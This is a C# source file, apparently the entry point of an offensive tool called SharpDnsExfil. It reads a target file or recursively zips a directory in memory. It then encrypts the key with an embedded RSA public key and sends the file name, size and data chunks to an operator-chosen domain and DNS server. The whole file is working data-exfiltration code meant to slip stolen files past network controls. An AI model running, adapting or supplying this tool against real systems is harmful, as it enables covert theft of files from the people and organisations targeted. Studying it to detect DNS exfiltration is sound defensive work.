using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using CommandLine;
using SharpDnsExfil.Utils;
using System.IO.Compression;

namespace SharpDnsExfil
{

    class Program
    {

        static void banner()
        {
            string help = @"
____  _   _ ____  _____       __ _ _ 
|  _ \| \ | / ___|| ____|_  __/ _(_) |
| | | |  \| \___ \|  _| \ \/ / |_| | |
| |_| | |\  |___) | |___ >  <|  _| | |
|____/|_| \_|____/|_____/_/\_\_| |_|_|
@ch4rm
";
            Console.WriteLine(help);
        }

        static void Main(string[] args)
        {
            banner();

            CommandLine.Parser.Default.ParseArguments<Options>(args)
             .WithParsed(RunOptions)
             .WithNotParsed(HandleParseError);

        }

        public static string xorKey = EncryptionUtils.GenerateRandomKey(10);

        public static readonly string SPubKey = @"<RSAKeyValue><Exponent>AQAB</Exponent><Modulus>1POCyvc01aGQEdruBOO/BA6Axa8HOAjhx3ZRXVrPRYbIuYc+2IrYeH1HpjOMg7P0Q0dUiVJXbwrnMCUwSRPcX4Dpo00z6OdVrtlBQ4VtHr/XTXsEhU1d3iK8VueR6/LcTPahKQdeXjTCbcTY7m8hJsAyo1iMjFO3cixU+vqchyVcs6ojpTWEgCihTxel2zEQl5h9j4oWWSKldA9oywRtTxDrD4a/RAzefjPwWSRHb19UFkwV5RYu11Fc2RB0ICw2Ezf3EPXxhtjhS+NIt2Hn+fP1sAZRACeoZqMls5smXyq3AKCYZdS/orwVHcE9h+5Dj1GQP/BkmaccfaPY/a1OGQ==</Modulus></RSAKeyValue>";

        public static void RunOptions(Options opts)
        {
            var filePath = opts.FilePath;
            Utilities utils = new Utilities();
            RSA RSAEnc = new RSA();

            int currentByte = 0;
            int oldPercent = 0;
            long totalSize = 0;
            var fileName = "";
            Stream fileStream;

            if (opts.Encrypt)
            {
                string xorKeyEncoded = RSAEnc.Encrypt(xorKey, SPubKey);
                Logger.WriteLine($"Encrypted key generated: {xorKeyEncoded}", opts.Verbose);

                foreach (var str in utils.SplitString(xorKeyEncoded))
                {
                    utils.Exfiltrate(Encoding.UTF8.GetBytes("XEnc:::" + str), opts.Domain, opts.Server, opts.Verbose, false);
                }
            }
            else
            {
                utils.Exfiltrate(Encoding.UTF8.GetBytes("XOR Key:::" + xorKey), opts.Domain, opts.Server, opts.Verbose, false);
            }

            if (File.GetAttributes(filePath).HasFlag(FileAttributes.Directory))
            {
                //https://stackoverflow.com/questions/17232414/creating-a-zip-archive-in-memory-using-system-io-compression
                //https://docs.microsoft.com/en-us/dotnet/api/system.io.compression.gzipstream?view=net-5.0
                string[] targetDirs = Directory.EnumerateFiles(filePath, "*.*", SearchOption.AllDirectories).ToArray();
                var zipStreamObject = Zip.CompressFilesMemoryStream(opts, targetDirs, "password!");

                fileName = Path.GetFileName("temp.zip");
                totalSize =zipStreamObject.memStream.Length;
                fileStream = zipStreamObject.memStream;
            }
            else
            {

                if (!File.Exists(filePath))
                {
                    Console.WriteLine("[!] File not exist");
                    return;
                }

                fileName = Path.GetFileName(filePath);
                totalSize = utils.GetFileSize(filePath);
                fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
            }

            utils.Exfiltrate(Encoding.UTF8.GetBytes("File Name:::" + fileName), opts.Domain, opts.Server, opts.Verbose);

            utils.Exfiltrate(Encoding.UTF8.GetBytes("File Size:::" + totalSize), opts.Domain, opts.Server, opts.Verbose);

            foreach (var chunk in utils.ReadStreamChunks(fileStream))
            {
                currentByte += chunk.Length;
                int percent = (int)(0.5f + ((100f * currentByte) / totalSize));

                if ((int)percent.ToString()[0] != (int)oldPercent.ToString()[0])
                    Logger.WriteLine($"Uploading to {opts.Domain} - {percent}% transfered", opts.Verbose);
                oldPercent = percent;
                
                utils.Exfiltrate(chunk, opts.Domain, opts.Server, opts.Verbose);
            }
        }

        static void HandleParseError(IEnumerable<Error> errs)
        {
        }
    }
}
